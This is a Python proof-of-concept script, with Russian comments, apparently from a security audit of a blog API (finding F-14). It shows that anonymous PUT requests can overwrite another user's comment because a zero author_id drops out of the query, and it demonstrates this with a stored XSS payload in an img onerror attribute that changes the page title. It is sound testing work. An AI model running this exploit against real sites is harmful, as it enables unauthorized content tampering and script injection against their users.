# -*- coding: utf-8 -*-
"""F-14. PUT комментария висит без обязательной авторизации.
У анонима author_id равен 0, GORM выкидывает это поле из WHERE,
и обновляется чужой комментарий.
"""
import time

from _http import Client, parser

PAYLOAD = '<img src=x alt="comment-xss" onerror="document.title=\'COMMENT-XSS\'">'


def main():
    p = parser("Анонимная правка чужого комментария")
    p.add_argument("--restore", action="store_true", help="вернуть исходный текст после проверки")
    args = p.parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    author = client.register(f"cauth{stamp}", f"cauth{stamp}@poc.local", "Passw0rd!cauth")
    status, article, raw = client.call(
        "POST",
        "/api/articles",
        token=author,
        body={
            "article": {
                "title": f"Comment host {stamp}",
                "description": "host",
                "body": "host body",
                "tagList": ["poc"],
            }
        },
    )
    if status not in (200, 201):
        raise SystemExit(f"статья не создана: {status} {raw[:200]!r}")
    slug = article["article"]["slug"]
    original = f"original-{stamp}"
    status, comment, raw = client.call(
        "POST",
        f"/api/articles/{slug}/comments",
        token=author,
        body={"comment": {"body": original}},
    )
    if status not in (200, 201):
        raise SystemExit(f"комментарий не создан: {status} {raw[:200]!r}")
    cid = comment["comment"]["id"]
    owner = comment["comment"]["author"]["username"]

    status, edited, raw = client.call(
        "PUT",
        f"/api/articles/{slug}/comments/{cid}",
        body={"comment": {"body": PAYLOAD}},
    )
    if status != 200 or edited["comment"]["author"]["username"] != owner:
        raise SystemExit(f"анонимная правка не прошла: {status} {raw[:300]!r}")
    if edited["comment"]["body"] != PAYLOAD:
        raise SystemExit("тело не заменилось")
    print(f"OK комментарий {cid} автор остался {owner}")
    print(f"откройте: {client.base}/article/{slug}")
    print("ожидаемый document.title: COMMENT-XSS")
    if args.restore:
        client.call(
            "PUT",
            f"/api/articles/{slug}/comments/{cid}",
            body={"comment": {"body": original}},
        )
        print("текст возвращён")


if __name__ == "__main__":
    main()
